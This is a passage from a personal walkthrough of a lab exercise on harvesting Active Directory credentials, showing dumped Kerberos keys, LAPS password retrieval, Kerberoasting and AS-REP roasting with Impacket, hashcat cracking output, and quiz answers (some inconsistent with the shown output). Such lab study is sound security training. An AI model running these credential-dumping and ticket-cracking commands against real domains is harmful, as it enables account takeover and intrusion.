thm.red\thm-local:aes256-cts-hmac-sha1-96:a7e2212b58079608beb08542187c9bef1419d60a0daf84052e25e35de1f04a26
thm.red\thm-local:aes128-cts-hmac-sha1-96:7c929b738f490328b13fb14a6cfb09cf
thm.red\thm-local:des-cbc-md5:9e3bdc4c2a6b62c4
thm.red\admin:aes256-cts-hmac-sha1-96:7441bc46b3e9c577dae9b106d4e4dd830ec7a49e7f1df1177ab2f349d2867c6f
thm.red\admin:aes128-cts-hmac-sha1-96:6ffd821580f6ed556aa51468dc1325e6
thm.red\admin:des-cbc-md5:32a8a201d3080b2f
thm.red\svc-thm:aes256-cts-hmac-sha1-96:8de18b5b63fe4083e22f09dcbaf7fa62f1d409827b94719fe2b0e12f5e5c798d
thm.red\svc-thm:aes128-cts-hmac-sha1-96:9fa57f1b464153d547cca1e72ad6bc8d
thm.red\svc-thm:des-cbc-md5:f8e57c49f7dc671c
thm.red\bk-admin:aes256-cts-hmac-sha1-96:48b7d6de0b3ef3020b2af33aa43a963494d22ccbea14a0ee13b63edb1295400e
thm.red\bk-admin:aes128-cts-hmac-sha1-96:a6108bf8422e93d46c2aef5f3881d546
thm.red\bk-admin:des-cbc-md5:108cc2b0d3100767
thm.red\test-user:aes256-cts-hmac-sha1-96:2102b093adef0a9ddafe0ad5252df78f05340b19dfac8af85a4b4df25f6ab660
thm.red\test-user:aes128-cts-hmac-sha1-96:dba3f53ecee22330b5776043cd203b64
thm.red\test-user:des-cbc-md5:aec8e3325b85316b
sshd:aes256-cts-hmac-sha1-96:07046594c869e3e8094de5caa21539ee557b4d3249443e1f8b528c4495725242
sshd:aes128-cts-hmac-sha1-96:e228ee34b8265323725b85c6c3c7d85f
sshd:des-cbc-md5:b58f850b4c082cc7
CREDS-HARVESTIN$:aes256-cts-hmac-sha1-96:f645be10cf13eea8292fc57bb3e0e0f36acbb1b42d7a87c307cab3063792e94b
CREDS-HARVESTIN$:aes128-cts-hmac-sha1-96:efa7e634eb6ca6fb635310c33622e95e
CREDS-HARVESTIN$:des-cbc-md5:da049b160e79da7a
[*] Cleaning up... 
```

Cool beans!

__Questions__

Apply the technique discussed in this task to dump the NTDS file **locally** and extract hashes. What is the target system bootkey value? **Note**: Use thm.red/thm as an Active Directory user since it has administrator privileges!
Answer: _0x36c8d26ec0df8b23ce63bcefa6e2d821_

What is the clear-text password for the **bk-admin** username?
Answer: _Passw0rd123_


Task8 - Local Administrator Password Solution (LAPS)
----------------------------------------------------------------

In this task we will learn how to get local admin within AD if a LAPS feature is configured/enabled.

__Group Policy Preferences (GPP)__

In a large corporate environment it is difficult to change all of the local Admin accounts so Microsoft implemented a way to change these accounts across workstations using GPP.

GPP is a utility that allows admins to create domain policies w/ embedded credentials. After deployment various XML files are created in the SYSVOL folder. Since this directory is park of AD on a NTFS volume and is shared, all authenticated users on the domain can access it.

When GPP was first made, the XML files contained a password encrypted with  AES-256. Somehow, Microsoft accidentally published their Private Key on MSDN and since that time, Domain users could read the content of the SYSVOL folder. This is easy to crack now as there are quite a few tools like  [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) for cracking it.

__Local Administrator Password Solution (LAPS)__

In 2015 Microsoft removed the storing of encrypted passwords in the SYSVOL folder, and introduced LAPS, which is a much more secure way of remotely managing the local Admin passwords.

With LAPS, Microsoft introduced 2 new attributes:
 * ms-mcs-AdmPwd - Clear text password
 * ms-mcs-AdmPwdExpirationTime - Expireation time

LAPS uses `admpwd.dll` to change the local admin password and update the value of ms-msc-AdmPwd.

__Enumerate for LAPS__

We can check for LAPS in the `admpwd.dll` path.

```shell-session
C:\Users\thm>dir "C:\Program Files\LAPS\CSE" 
Volume in drive C has no label. 
Volume Serial Number is A8A4-C362 

Directory of C:\Program Files\LAPS\CSE 

06/06/2022 01:01 PM . 
06/06/2022 01:01 PM .. 
05/05/2021 07:04 AM 184,232 AdmPwd.dll 
			1 File(s) 184,232 bytes 
			2 Dir(s) 10,306,015,232 bytes free
```

![[Screenshot 2022-11-21 at 2.18.22 PM.png]]

Looks like it exists. We change check available AdmPwd cmdlets:

```shell-session
PS C:\Users\thm> Get-Command *AdmPwd* 

CommandType Name Version Source 
----------- ---- ------- ------ 
Cmdlet Find-AdmPwdExtendedRights 5.0.0.0 AdmPwd.PS 
Cmdlet Get-AdmPwdPassword 5.0.0.0 AdmPwd.PS 
Cmdlet Reset-AdmPwdPassword 5.0.0.0 AdmPwd.PS 
Cmdlet Set-AdmPwdAuditing 5.0.0.0 AdmPwd.PS 
Cmdlet Set-AdmPwdComputerSelfPermission 5.0.0.0 AdmPwd.PS 
Cmdlet Set-AdmPwdReadPasswordPermission 5.0.0.0 AdmPwd.PS 
Cmdlet Set-AdmPwdResetPasswordPermission 5.0.0.0 AdmPwd.PS 
Cmdlet Update-AdmPwdADSchema 5.0.0.0 AdmPwd.PS
```

![[Screenshot 2022-11-21 at 2.19.35 PM.png]]
Now we need to find the AD OU that has "All extended rights" to deal with LAPS.

NOTE: You can use a wildcard of `-Identity *` when searching for all OUs.

```shell-session
PS C:\Users\thm> Find-AdmPwdExtendedRights -Identity THMorg

ObjectDN ExtendedRightHolders 
-------- -------------------- 
OU=THMorg,DC=thm,DC=red {THM\THMGroupReader}
```

![[Screenshot 2022-11-21 at 2.21.19 PM.png]]

We can see that the THMGroupReader group in the THMorg has the access we want to LAPS. We can review the group and it's members like so:

```shell-session
PS C:\Users\thm> net groups "THMGroupReader" 
Group name THMGroupReader
Comment 

Members 

------------------------------------------------------------------------------- 
bk-admin 
The command completed successfully. 

PS C:\Users\victim> net user test-admin 
User name        test-admin 
Full Name        THM Admin Test Comment 
User's comment 
Country/region code 000 (System Default) 
Account active Yes 
Account expires Never 

[** Removed **] 
Logon hours allowed All 

Local Group Memberships 
Global Group memberships *Domain Users *Domain Admins 
                        *THMGroupReader *Enterprise Admins 
The command completed successfully.
```

![[Screenshot 2022-11-21 at 2.29.53 PM.png]]

__Getting the Password__

In this case, bk-admin is a member of the THMGroupReader account so we will need to get their credentials or impersonate them. Once we do that we can use `Get-AdmPwdPassword` cmdlet:

```shell-session
PS C:\> Get-AdmPwdPassword -ComputerName creds-harvestin

ComputerName DistinguishedName Password ExpirationTimestamp 
------------ ----------------- -------- ------------------- 
CREDS-HARVESTIN CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red FakePassword 2/11/2338 11:05:2...
```

![[Screenshot 2022-11-21 at 2.31.36 PM.png]]

In real life, LAPS may only be enabled on a few machines so our enumeration would include finding those. There are some tools to help with that such as the [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) PowerShell script.


__Questions__

Which group has ExtendedRightHolder and is able to read the LAPS password?
Answer: _LAPsReader_

Follow the technique discussed in this task to get the LAPS password. What is the LAPs Password for **Creds-Harvestin** computer?
Answer: _THMLAPSPassw0rd_

Which user is able to read LAPS passwords?
Answer: _bk-admin_


Task9 - Other Attacks
----------------------------

In some of the previous attacks, it was assumed we had credentials. In this section we will cover some techniques to get credentials on the victim network.

__Kerberoasting__

For this attack to work we have to have access to the SPN (Service Principal Name) accounts like IIS User, MSSQL etc. With this attack we request a TGT (Ticket Granting Ticket) and TGS (Ticket Granting Service) with the goal of lateral movement.

First we need to find the SPN for the service. We can use some Impacket script for this on the Attackbox:

```bash
# python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.44.10 THM.red/thm
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-thm            2022-06-10 10:47:33.796826  <never>               
```

We have an account here called svc-thm. We can now request a TGT with this user:

```bash
# python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.44.10 THM.red/thm -request-user svc-thm
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-thm            2022-06-10 10:47:33.796826  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc-thm$THM.RED$THM.red/svc-thm*$1e8f04831fecd59ff3e4dab3389638ff$ac10dec3d18ce7ff6a310e285ecb0178a70acbe391174ae83e715aa5736074e7d91d96108f7baf21a20b4867d2206194763d932bbc04fe6ae7eecd47011d58f2a4a682663fba2461dcd5132627016a2228c9bc3e2035c2f376d363c14424e140102435e8e8b6bfc3dc0aeba29ecea116c91b6e74ade80ce38b674215e61744082e51a9ef022ab1310f90081f00348366982fe16099090a6fb14335bed9354cccbdb9bb40f0797c8163a4452f6b8b939d3f3772c777700dfae15919a6953dd255d26d7630adf529a8c349136d37307ab8560cfd9731c5239569db3f26559ec9a64ce5f4bc0ad5f1f92bf6b4aa4a775913baa6ae6d7d989523df5bb386cebcdbab05183921ddfb4c06fc7bf8fa537fa7929828e787457b23b713beba55e8bd1c2b753a615e414af9ae6b09751c6bd54f4488da9c8913f24f29e7c2507e9f2b015be975ec76458b2756a8f53bf5cfcf61ca34da4be93f2d6fd28fd8dd2df05824d062f4380d61237944cb361743dec909cb3f6347267a9d38268a676b1da7f36a46e9778658031ef6d2bfefb70ec51c25b4dd319a5c8172b2150953ce1246b8d207115c54443832b197012726c4bfaeb1746903b7ffa5fb39f90780252647c6997c334d2e82c138ff004956181e556a1c46190cd29d3d559624b2e90c324d7f5994db4987aed1e778d9dc4fdb27bf0c2ed4c6640084b3f9ed7b03df9220dc092d2c2dac75413bef6498bd24d67a62d8587f8dfc3fc446d1a1ff38d2e18243345caa81159d712e2bc5f86614ba5a0aa9023dd0674a19e7313b199672a6cbfe34d28ee9d4397c5570fd31477838466a9d18cde23281b9b54387cf1f15658ea236c0461713ddcb9e956459593872767ba69f812e76a92ec8669dd2f66598d528ac6657d1541324b6ea9a6d38f8456a3ec8691f379c5f17c5acaaabd89fa3afa764f65dd112462a5a26c6d21220d8075f928746601b54e12609794435871d3f9640aa26c7584fb739a30f14bc6777ea798d10e0db29fa5954b40d5f9390be8b52a1ab7bf626023e881c34bda7e5e4ebff8f8e96baec6979ecf2f1b1f7f7f09344237cd21506d921ba6eba352c0aadf5abbcb0136933e66a1fa2e0caf73260a2242b44a04af6bb5e5af16a84111b33c00a6c16dcc51317b4c1cf415bc785a5257e31e7459a59b83f60d6b52a0f72ef747b83b7a405c18c9ed1111aadb251c3255acd89b73bc7128d47b9fc20b3b2eadf1b310ef990c9a6c1fe0dcdb1
```

So we take that whole thing starting at `$krb` and ending in `cdb1` and put in in a file. I called mine spn.hash.

Then we can run hashcat on that with type 13100:

```bash
# hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1-66-g6a419d06) starting...

* Device #2: Outdated POCL OpenCL driver detected!

This OpenCL driver has been marked as likely to fail kernel compilation or to produce false negatives.
You can use --force to override this, but do not report related errors.

OpenCL API (OpenCL 1.2 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz, 3878/3942 MB (985 MB allocatable), 2MCU

OpenCL API (OpenCL 1.2 pocl 1.1 None+Asserts, LLVM 6.0.0, SPIR, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
===========================================================================================================================
* Device #2: pthread-Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 35 MB

Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553435 bytes (23.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 67106875 bytes (47.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 100660309 bytes (71.Dictionary cache building /usr/share/wordlists/rockyou.txt: 134213745 bytes (95.Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 12 secs

$krb5tgs$23$*svc-thm$THM.RED$THM.red/svc-thm*$1e8f04831fecd59ff3e4dab3389638ff$ac10dec3d18ce7ff6a310e285ecb0178a70acbe391174ae83e715aa5736074e7d91d96108f7baf21a20b4867d2206194763d932bbc04fe6ae7eecd47011d58f2a4a682663fba2461dcd5132627016a2228c9bc3e2035c2f376d363c14424e140102435e8e8b6bfc3dc0aeba29ecea116c91b6e74ade80ce38b674215e61744082e51a9ef022ab1310f90081f00348366982fe16099090a6fb14335bed9354cccbdb9bb40f0797c8163a4452f6b8b939d3f3772c777700dfae15919a6953dd255d26d7630adf529a8c349136d37307ab8560cfd9731c5239569db3f26559ec9a64ce5f4bc0ad5f1f92bf6b4aa4a775913baa6ae6d7d989523df5bb386cebcdbab05183921ddfb4c06fc7bf8fa537fa7929828e787457b23b713beba55e8bd1c2b753a615e414af9ae6b09751c6bd54f4488da9c8913f24f29e7c2507e9f2b015be975ec76458b2756a8f53bf5cfcf61ca34da4be93f2d6fd28fd8dd2df05824d062f4380d61237944cb361743dec909cb3f6347267a9d38268a676b1da7f36a46e9778658031ef6d2bfefb70ec51c25b4dd319a5c8172b2150953ce1246b8d207115c54443832b197012726c4bfaeb1746903b7ffa5fb39f90780252647c6997c334d2e82c138ff004956181e556a1c46190cd29d3d559624b2e90c324d7f5994db4987aed1e778d9dc4fdb27bf0c2ed4c6640084b3f9ed7b03df9220dc092d2c2dac75413bef6498bd24d67a62d8587f8dfc3fc446d1a1ff38d2e18243345caa81159d712e2bc5f86614ba5a0aa9023dd0674a19e7313b199672a6cbfe34d28ee9d4397c5570fd31477838466a9d18cde23281b9b54387cf1f15658ea236c0461713ddcb9e956459593872767ba69f812e76a92ec8669dd2f66598d528ac6657d1541324b6ea9a6d38f8456a3ec8691f379c5f17c5acaaabd89fa3afa764f65dd112462a5a26c6d21220d8075f928746601b54e12609794435871d3f9640aa26c7584fb739a30f14bc6777ea798d10e0db29fa5954b40d5f9390be8b52a1ab7bf626023e881c34bda7e5e4ebff8f8e96baec6979ecf2f1b1f7f7f09344237cd21506d921ba6eba352c0aadf5abbcb0136933e66a1fa2e0caf73260a2242b44a04af6bb5e5af16a84111b33c00a6c16dcc51317b4c1cf415bc785a5257e31e7459a59b83f60d6b52a0f72ef747b83b7a405c18c9ed1111aadb251c3255acd89b73bc7128d47b9fc20b3b2eadf1b310ef990c9a6c1fe0dcdb1:Passw0rd1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*svc-thm$THM.RED$THM.red/svc-thm*$1e8f0...0dcdb1
Time.Started.....: Mon Nov 21 05:52:53 2022 (0 secs)
Time.Estimated...: Mon Nov 21 05:52:53 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   464.7 kH/s (11.36ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 229376/14344384 (1.60%)
Rejected.........: 0/229376 (0.00%)
Restore.Point....: 221184/14344384 (1.54%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: froggy17 -> 170176

Started: Mon Nov 21 05:52:19 2022
Stopped: Mon Nov 21 05:52:55 2022

```

__AS-REP Roasting__

This is a technique where we are looking to be able steal hashes for AD users where their account options are set to "Do not require Kerberos pre-authentication", which is some kinda backward compatiblity for older Kerberos version support that allows for auth without a password. Once we get the hash we can take it offline to crack it.

For now say we have a list of users that we saved in `users.txt`. We can run another Impacket script called GetNPUsers.py to see which ones we have:

```bash
# python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.44.10 thm.red/ -usersfile users.txt
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User thm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User sshd doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$victim@THM.RED:fc4d42c5daf3f0e15bc94f74d56be1d3$aff67ae28b684e1b269554b50f39f7542a36866481519ac4894cad025a1b455c3ead7be8838adae9adeadd01596d36f487b21a02067b67ba500756e2a9f3b6b09ef6abede44462f66daa1ca2bbbd7cd29bafdaa321f7441133f3bf0a22514eabf1b07a38fd7608c478deb6132d795a7e2e9402d98370338153405fdf68b3fbfbaf2399dd84eab2b2fec5c7729a75fdec88a816c2612d3fb8ed580fdc8da0eef17cf25a987e4894feb3fc5036020c949b7a7ef691b0a32a214ef72418cf7afae5b70de38935e007e53fd0955dfa5524288bf3da7a970fe77c5754838797ea89c469fa
[-] User CREDS-HARVESTIN$ doesn't have UF_DONT_REQUIRE_PREAUTH set
```

So we have one there listed that we can use, since the tool generated a ticket for us in the output.

There are lots of tools that can crack these like John and Hashcat and Rubeus. The tool we used also has an option to output to John or Hashcat formats, see `-format` and works well with `-outputfile <hash.txt>`

__SMB Relay Attack__

This attack abuses the NTLM authentication mechanism where the attacker performs a man-in-the-middle attack. For this to work SMB signing must be turned off. 

__LLMNR/NBNS Poisoning__

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) help local network machines to find the right machine if DNS fails. 

The attacker poses as an authoritative source inside the network and responds to LLMNR and NBT-NS traffic.

The goal of these types of SMB and LLMNR poisoning attacks is to steal the NTLM hashes from the Victim to either crack or play pass-the-hash.

__Questions__

Enumerate for SPN users using the Impacket GetUserSPNs script. What is the Service Principal Name for the Domain Controller?
Answer: _svc-thm_

After finding the SPN account from the previous question, perform the Kerberoasting attack to grab the TGS ticket and crack it. What is the password?
Answer: _Passw0rd1_


Task9 - Conclusion
------------------------

This was a very useful room where we learned a lot about gather initial credentials from both the local computer and the AD.

Here are some of the topics:
* Dump memory
* LSASS.exe and extracting hashes
* Windows Credential Manager
* LAPS
* Impacket Scripts GetUserSPNs.py and GetNPUsers.py

Here are some other ideas for enumeration for sensative info:

-   [Snaffler](https://github.com/SnaffCon/Snaffler)
-   [Seatbelt](https://github.com/GhostPack/Seatbelt)
-   [Lazagne](https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/)

__Questions__

Good work on finishing the room and keep learning!
Answer: _None Needed_




